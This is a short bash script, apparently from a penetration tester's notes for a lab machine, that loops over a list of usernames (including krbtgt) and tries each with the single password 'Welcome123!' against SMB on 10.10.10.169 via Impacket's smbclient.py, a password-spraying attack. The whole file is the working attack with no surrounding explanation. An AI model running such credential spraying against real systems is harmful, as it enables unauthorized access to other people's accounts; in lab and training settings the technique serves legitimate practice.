USERS="krbtgt ryan marko sunita abigail marcus sally fred angela felicia gustavo ulf stevie claire paulo steve annette annika per claude melanie zach simon naoki"

for u in ${USERS[@]}; do
	echo $u
	python3 ~/GitHub/Pentesting_Tools/Enumeration/Impacket/smbclient.py $u:Welcome123\!@10.10.10.169
	echo ""
done; 